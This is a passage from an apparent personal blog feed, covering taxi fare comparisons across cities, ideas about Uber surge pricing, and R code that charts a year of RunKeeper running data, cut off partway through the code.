Aires</td><td>1.81</td><td>0.00</td><td>1.00</td><td>0.18</td><td>1.61</td><td>1.00</td><td>1.81</td><td>1.61</td><td>0.18</td><td>9.20</td><td>10.50</td></tr><tr><td>Cairo</td><td>2.50</td><td>0.00</td><td>1.25</td><td>0.28</td><td>1.61</td><td>0.14</td><td>0.35</td><td>0.28</td><td>0.04</td><td>7.19</td><td>2.35</td></tr><tr><td>Dhaka</td><td>250.00</td><td>0.00</td><td>35.00</td><td>4.17</td><td>1.61</td><td>0.01</td><td>3.25</td><td>0.73</td><td>0.05</td><td>13.51</td><td>3.25</td></tr><tr><td>Istanbul</td><td>2.80</td><td>0.00</td><td>1.73</td><td>0.33</td><td>1.61</td><td>0.46</td><td>1.29</td><td>1.28</td><td>0.15</td><td>8.44</td><td>9.11</td></tr><tr><td>Jakarta</td><td>6000.00</td><td>0.00</td><td>3550.00</td><td>500.00</td><td>1.61</td><td>0.00</td><td>0.49</td><td>0.47</td><td>0.04</td><td>11.43</td><td>2.46</td></tr><tr><td>Lagos</td><td>3.32</td><td>0.00</td><td>3.06</td><td>0.16</td><td>1.61</td><td>1.00</td><td>3.32</td><td>4.93</td><td>0.16</td><td>31.58</td><td>9.36</td></tr><tr><td>Manila</td><td>50.00</td><td>0.00</td><td>13.60</td><td>1.75</td><td>1.61</td><td>0.02</td><td>1.10</td><td>0.48</td><td>0.04</td><td>12.51</td><td>2.31</td></tr><tr><td>Rio de Janeiro</td><td>4.70</td><td>0.00</td><td>1.70</td><td>0.37</td><td>1.61</td><td>0.42</td><td>1.97</td><td>1.15</td><td>0.16</td><td>7.38</td><td>9.35</td></tr><tr><td>Seoul</td><td>2800.00</td><td>0.00</td><td>1050.00</td><td>206.00</td><td>1.61</td><td>0.00</td><td>2.63</td><td>1.59</td><td>0.19</td><td>8.21</td><td>11.62</td></tr></tbody></table>

<p>Using this information we can run a few interesting analyses:</p>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-mile-vs-distance.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-mile-vs-distance.png" alt="USD per minute vs USD per mile" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>USD per minute vs USD per mile.</strong> The most obvious check is to see the most and least expensive cities by the two dimensions we have - distance and time. The results are expected - Asian and African cities tend to be the least expensive and European cities being the most expensive. Within Asia there's pretty significant variance with South and Southeast Asia being the cheapest but Seoul and Tokyo being more expensive. A city that stood out was Lagos - it has the one of the lowest per minute fares but one of the largest per mile fares. I don't know why this is the case but I suspect it has something to do with t sure why this is the case other than the roads being in poor condition and the price needing to take that into account.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-fixed-time-10.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-fixed-time-10.png" alt="Keep time fixed at 10 minutes but vary distance" width="800" height="1200" layout="responsive"/>
      </a>
      <p>
        <strong>Keep time fixed at 10 minutes but vary distance.</strong> The idea here is to look at how quickly the prices increase by distance for different cities. This echoes the previous chart of Europe and Lagos having the highest per mile fares.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-fixed-distance-4.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-fixed-distance-4.png" alt="Keep distance fixed at 4 miles but vary time" width="800" height="1200" layout="responsive"/>
      </a>
      <p>
        <strong>Keep distance fixed at 4 miles but vary time.</strong> Similar to the previous plot but look at the way price will increase as a function of time. Not much new data here.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-max-miles-max-minutes.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-max-miles-max-minutes.png" alt="What does $10 get you?" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>What does $10 get you?</strong> Another way to look at expenses is to see the maximum time and distance $10 will get you in different cities. This is similar to looking at the inverse of the per minute and per mile prices.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-max-miles-max-minutes-zoom.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-max-miles-max-minutes-zoom.png" alt="What does $10 get you (zoomed)?" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>What does $10 get you (zoomed)?</strong> This zooms in the bottom left corner of the previous plot. Turns out that having $10 in an expensive city doesn't go very far.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-mile-min-ratios.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-mile-min-ratios.png" alt="Distribution of $ per mile vs $ per min ratios" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>Ratio of $ per mile vs $ per minute.</strong> The goal was to see how many times a mile was more expensive than a minute for the different cities. The reason we see such high ratios is that the price of gas has a lower variance from city to city than the cost of labor - this leads to cities with low labor casts having significantly higher ratios.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-heatmap-fares.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-heatmap-fares.png" alt="Heatmap of the fares as a function of time and distance by city" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>Heatmap of fares as a function of time and distance.</strong> I wanted this to be a bit more insightful in order to be able to compare all cities against each other across both dimensions but the extreme differences make it difficult to visualize. This highlights once more how expensive Zurich is compared to the other cities. The heatmaps below cluster the cities by the sum of price per mile and price per minute in order to visualize them along similar price scales.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-heatmap-fares-0.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-heatmap-fares-0.png" alt="Heatmap of the fares as a function of time and distance by city 1st" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>Heatmap of the fares as a function of time and distance by city (1st quartile).</strong>
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-heatmap-fares-1.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-heatmap-fares-1.png" alt="Heatmap of the fares as a function of time and distance by city 2nd" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>Heatmap of the fares as a function of time and distance by city (2ng quartile).</strong>
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-heatmap-fares-2.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-heatmap-fares-2.png" alt="Heatmap of the fares as a function of time and distance by city 3rd" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>Heatmap of the fares as a function of time and distance by city (3rd quartile).</strong>
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/taxi-heatmap-fares-3.png">
        <img src="http://dangoldin.com/assets/static/images/taxi-heatmap-fares-3.png" alt="Heatmap of the fares as a function of time and distance by city 4th" width="800" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>Heatmap of the fares as a function of time and distance by city (4th quartile).</strong>
      </p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Surge pricing ideas</title>
   <link href="http://dangoldin.com/2014/01/05/surge-pricing-ideas/"/>
   <updated>2014-01-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/01/05/surge-pricing-ideas</id>
   <content:encoded><![CDATA[
<p>Every time there’s a big event or terrible weather, there’s a slew of complaints about Uber’s surge pricing. By now, you’d think that Uber customers would expect this to happen and yet they’re surprised when a $10 cab ride turns into a $100 Uber ride. I suspect Uber’s already done as much as it can on the messaging side; psychologically it’s just tough for someone to take a $10 ride one day and then a day later pay an order of magnitude more.</p>

<p>Every Uber transaction involves three parties - the customer, the driver, and Uber. In every case it’s up to Uber to set the prices in order to get the supply (drivers) equal to the demand (customers). In most cases, these are in alignment since people are willing to pay more for an Uber than a cab for the convenience. the problem occurs when the demand side gets too large and Uber needs to drastically increase prices in order to encourage more supply. Uber should have enough data by now to be able to determine the prices that will lead to supply being equal to demand for every demand level but that doesn’t solve the perception problem.</p>

<p>One <a href="http://continuations.com/post/70483387053/some-thoughts-on-surge-pricing#comment-1170534784" target="_blank">suggestion</a> I liked was having Uber drop their margin on these high demand days in order to maintain goodwill. Uber <a href="http://www.quora.com/Uber-1/What-percentage-cut-does-Uber-take-from-the-total-fare-cost-of-a-ride" target="_blank">supposedly takes ~20%</a> of each fare and that could remain the case for low fares but Uber can drop that on surge days in order to reduce the customer cost. This way a $10 drip gives Uber $2 but a $100 trip no longer needs to bring Uber $20 and can be set closer to $80. The issue is that people won’t care that a $100 trip now costs $80. Instead they’ll hear that a $10 trip now costs $80. The only way to make consumers happy would be for Uber to have a deep negative margin for the surge days.</p>

<p>Another option is to move to an auction model. Each customer would specify where they are, where they want to go, and what they want to pay and it would be up to a driver to either accept or ignore that offer. This way Uber can achieve <a href="https://en.wikipedia.org/wiki/Price_discrimination" target="_blank">perfect price discrimination</a> with both drivers and customers getting what they want.</p>

<p>Uber must have considered both of these approaches. The latter one would require a significantly different product with more complicated logistics and a more difficult pitch but it would keep the various parties aligned to their reserve price. The former approach, on the other hand, would be much easier and cheaper to achieve. I believe Uber would be still be profitable if they took a negative margin on the rare surge day and they could offset it with a small increase in the margin on a normal day. The only thing I can think of is that they’re taking the long term view and are hoping to change the customer perception of what’s fair. I don’t know if they’ll succeed but if they do I expect many more services start adopting these “purer price” models.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing RunKeeper data in R</title>
   <link href="http://dangoldin.com/2014/01/04/visualizing-runkeeper-data-in-r/"/>
   <updated>2014-01-04T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/01/04/visualizing-runkeeper-data-in-r</id>
   <content:encoded><![CDATA[
<p>What better way to celebrate running 1000 miles in 2013 than dumping the data into R and generating some visualizations? It’s also a step in my quest to replace Excel with R. I’ve included the code below with some comments as well as added it to <a href="https://github.com/dangoldin/runkeeper-stats" target="_blank">my GitHub</a>. If you have any ideas on what else I should do with it definitely let me know and I’ll give it a go.</p>

<p>PS. It’s great when web services allow users to export their data and wish more would start doing the same.</p>

<ul class="thumbnails">
	<li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-distance-cumulative.png" alt="Cumulative distance" width="800" height="600" layout="responsive"/>
      <p>
      	Cumulative distance. You can see a few flat areas in February and November when I took a break due to some minor injuries.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-distance-month.png" alt="Distance run by month" width="800" height="600" layout="responsive"/>
      <p>
      	Distance run by month. Unexpected drop in November due to a break but pretty solid otherwise.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-distance-week.png" alt="Distance run by week" width="800" height="600" layout="responsive"/>
      <p>
      	Distance run by week. Not much new information here that's not covered in the monthly graph.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-time-cumulative.png" alt="Cumulative time (hours)" width="800" height="600" layout="responsive"/>
      <p>
      	Cumulative time. Very similar shape to that of cumulative distance.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-time-vs-distance-cumulative.png" alt="Cumulative time vs distance (normalized)" width="800" height="800" layout="responsive"/>
      <p>
      	Cumulative time vs distance. Superimpose one on top of the other to compare the shapes. Started off slowly but started getting faster in October.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-speed-daily.png" alt="Speed by run" width="800" height="600" layout="responsive"/>
      <p>
      	Speed by run. I got significantly faster in October but slowed down again in December.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-speed-month-qs.png" alt="Speed by month by distance quantile" width="800" height="600" layout="responsive"/>
      <p>
      	Speed by month by distance quantile. The idea here was to look at my improvement in speed but controlling for distance. Echoes the previous chart showing my speed improvement in Oct for the longer distances.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-speed-distribution-qs.png" alt="Speed distribution by distance quantile" width="800" height="600" layout="responsive"/>
      <p>
      	Speed distribution by distance quantile. Another view that looks at the distribution of my speeds for all runs in a given distance quantile. Not much here but I was expecting to see that I'd have a faster pace for shorter runs.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-speed-vs-distance.png" alt="Speed vs Distance" width="800" height="800" layout="responsive"/>
      <p>
      	Speed vs Distance scatter plot. Another way to look at the relationship between speed and distance but not many new insights here. Slight correlation between speed and distance. This is pretty much because as I got faster I started doing longer runs. It'll be interesting to see how this changes in 2014.
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/rk-speed-vs-distance-clusters.png" alt="Speed vs Distance clustered" width="800" height="800" layout="responsive"/>
      <p>
      	Speed vs Distance scatter plot clustered. An attempt at clustering the runs by speed and distance. In this case they were basically clustered by distance since the speed didn't vary significantly.
      </p>
    </div>
  </li>
 </ul>

<figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="n">library</span><span class="p">(</span><span class="n">ggplot2</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">grid</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">gridExtra</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">reshape</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">scales</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">lattice</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">ggthemes</span><span class="p">)</span><span class="w">

</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read.csv</span><span class="p">(</span><span class="s2">"cardioActivities.csv"</span><span class="p">,</span><span class="w"> </span><span class="n">check.names</span><span class="o">=</span><span class="kc">FALSE</span><span class="p">)</span><span class="w">

</span><span class="n">summary</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w">

</span><span class="n">data</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">order</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">Date</span><span class="p">),]</span><span class="w"> </span><span class="c1"># Sort ascending by date</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">ymd</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">as.Date</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">Date</span><span class="p">)</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">month</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">as.Date</span><span class="p">(</span><span class="n">cut</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">ymd</span><span class="p">,</span><span class="w"> </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"month"</span><span class="p">))</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">week</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">as.Date</span><span class="p">(</span><span class="n">cut</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">ymd</span><span class="p">,</span><span class="w"> </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"week"</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">distance</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data</span><span class="o">$</span><span class="s1">'Distance (mi)'</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">distance_total</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">cumsum</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">distance</span><span class="p">)</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">speed</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data</span><span class="o">$</span><span class="s1">'Average Speed (mph)'</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">time_hours</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data</span><span class="o">$</span><span class="n">distance</span><span class="o">/</span><span class="n">data</span><span class="o">$</span><span class="s1">'Average Speed (mph)'</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">time_hours_total</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">cumsum</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">time_hours</span><span class="p">)</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">time_mins</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data</span><span class="o">$</span><span class="n">time_hours</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m">60</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">time_mins_total</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">cumsum</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">time_mins</span><span class="p">)</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">distance_total_norm</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data</span><span class="o">$</span><span class="n">distance_total</span><span class="o">/</span><span class="nf">sum</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">distance</span><span class="p">)</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">time_hours_total_norm</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data</span><span class="o">$</span><span class="n">time_hours_total</span><span class="o">/</span><span class="nf">sum</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">time_hours</span><span class="p">)</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">qs</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">cut</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">distance</span><span class="p">,</span><span class="w"> </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">quantile</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">distance</span><span class="p">),</span><span class="w"> </span><span class="n">include.lowest</span><span class="o">=</span><span class="kc">TRUE</span><span class="p">)</span><span class="w"> </span><span class="c1"># Quantile data by distance run</span><span class="w">

</span><span class="c1"># Generate a new data frame by qs and month to make plotting easier</span><span class="w">
</span><span class="n">data.qs_monthly</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">ddply</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">.</span><span class="p">(</span><span class="n">qs</span><span class="p">,</span><span class="w"> </span><span class="n">month</span><span class="p">),</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="w"> </span><span class="n">data.frame</span><span class="p">(</span><span class="n">distance</span><span class="o">=</span><span class="nf">sum</span><span class="p">(</span><span class="n">x</span><span class="o">$</span><span class="n">distance</span><span class="p">),</span><span class="w"> </span><span class="n">time_mins</span><span class="o">=</span><span class="nf">sum</span><span class="p">(</span><span class="n">x</span><span class="o">$</span><span class="n">time_mins</span><span class="p">)))</span><span class="w">
</span><span class="n">data.qs_monthly</span><span class="o">$</span><span class="n">speed</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data.qs_monthly</span><span class="o">$</span><span class="n">distance</span><span class="o">/</span><span class="p">(</span><span class="n">data.qs_monthly</span><span class="o">$</span><span class="n">time_mins</span><span class="o">/</span><span class="m">60</span><span class="p">)</span><span class="w">

</span><span class="c1"># Summarize the data by qs to make plotting easier</span><span class="w">
</span><span class="n">data.summary</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">ddply</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="o">~</span><span class="n">qs</span><span class="p">,</span><span class="n">summarise</span><span class="p">,</span><span class="n">mean_speed</span><span class="o">=</span><span class="n">mean</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span><span class="n">sd_speed</span><span class="o">=</span><span class="n">sd</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span><span class="n">mean_distance</span><span class="o">=</span><span class="n">mean</span><span class="p">(</span><span class="n">distance</span><span class="p">),</span><span class="n">sd_distance</span><span class="o">=</span><span class="n">sd</span><span class="p">(</span><span class="n">distance</span><span class="p">))</span><span class="w">

</span><span class="c1"># Cluster each of the runs by speed and data</span><span class="w">
</span><span class="n">m</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">as.matrix</span><span class="p">(</span><span class="n">cbind</span><span class="p">(</span><span class="n">data</span><span class="o">$</span><span class="n">speed</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="o">$</span><span class="n">distance</span><span class="p">),</span><span class="n">ncol</span><span class="o">=</span><span class="m">2</span><span class="p">)</span><span class="w">
</span><span class="n">cl</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">kmeans</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="m">3</span><span class="p">)</span><span class="w">
</span><span class="n">data</span><span class="o">$</span><span class="n">cluster</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">factor</span><span class="p">(</span><span class="n">cl</span><span class="o">$</span><span class="n">cluster</span><span class="p">)</span><span class="w">
</span><span class="n">centers</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">as.data.frame</span><span class="p">(</span><span class="n">cl</span><span class="o">$</span><span class="n">centers</span><span class="p">)</span><span class="w">

</span><span class="c1"># Normalize cumulative distance and time</span><span class="w">
</span><span class="n">data.normalized</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">melt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">id.vars</span><span class="o">=</span><span class="s2">"ymd"</span><span class="p">,</span><span class="w"> </span><span class="n">measure.vars</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="s2">"distance_total_norm"</span><span class="p">,</span><span class="s2">"time_hours_total_norm"</span><span class="p">))</span><span class="w">
</span><span class="n">data.normalized</span><span class="o">$</span><span class="n">variable</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">revalue</span><span class="p">(</span><span class="n">data.normalized</span><span class="o">$</span><span class="n">variable</span><span class="p">,</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="s2">"distance_total_norm"</span><span class="o">=</span><span class="s2">"Distance"</span><span class="p">,</span><span class="w"> </span><span class="s2">"time_hours_total_norm"</span><span class="o">=</span><span class="s2">"Time"</span><span class="p">))</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-speed-vs-distance.png'</span><span class="p">,</span><span class="w"> </span><span class="n">width</span><span class="o">=</span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="o">=</span><span class="m">800</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">speed</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="n">distance</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_point</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_color_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_abline</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Speed'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Distance'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Speed vs Distance"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-speed-vs-distance-clusters.png'</span><span class="p">,</span><span class="w"> </span><span class="n">width</span><span class="o">=</span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="o">=</span><span class="m">800</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">speed</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="n">distance</span><span class="p">,</span><span class="w"> </span><span class="n">color</span><span class="o">=</span><span class="n">cluster</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_color_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_point</span><span class="p">(</span><span class="n">legend</span><span class="o">=</span><span class="kc">FALSE</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_point</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">centers</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">V1</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="n">V2</span><span class="p">,</span><span class="w"> </span><span class="n">color</span><span class="o">=</span><span class="s1">'Center'</span><span class="p">),</span><span class="w"> </span><span class="n">size</span><span class="o">=</span><span class="m">52</span><span class="p">,</span><span class="w"> </span><span class="n">alpha</span><span class="o">=</span><span class="m">.3</span><span class="p">,</span><span class="w"> </span><span class="n">legend</span><span class="o">=</span><span class="kc">FALSE</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Speed'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Distance'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Speed vs Distance - Clustered"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-speed-month-qs.png'</span><span class="p">,</span><span class="n">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data.qs_monthly</span><span class="p">,</span><span class="w">
  </span><span class="n">aes</span><span class="p">(</span><span class="n">month</span><span class="p">,</span><span class="w"> </span><span class="n">speed</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_line</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">facet_grid</span><span class="p">(</span><span class="n">qs</span><span class="w"> </span><span class="o">~</span><span class="w"> </span><span class="n">.</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_x_date</span><span class="p">(</span><span class="w">
